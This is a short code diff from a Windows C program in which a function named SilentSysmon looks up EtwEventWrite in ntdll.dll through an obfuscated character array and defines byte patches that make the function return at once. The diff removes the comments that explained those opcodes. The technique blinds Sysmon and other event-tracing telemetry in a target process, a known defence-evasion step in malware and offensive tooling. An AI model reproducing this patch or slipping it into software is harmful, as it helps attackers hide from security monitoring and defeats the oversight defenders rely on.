@@ -29,16 +29,13 @@ BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
 
 
 int SilentSysmon(HANDLE hProc) {
-
 	HANDLE hThread = NULL;
 	unsigned char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
 	
 	void * pEventWrite = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR) sEtwEventWrite);
 #ifdef _WIN64
-	// xor rax, rax; ret
 	char patch[] = "\x48\x33\xc0\xc3";
 #else
-	// xor eax, eax; ret 14
 	char patch[] = "\x33\xc0\xc2\x14\x00";
 #endif
 
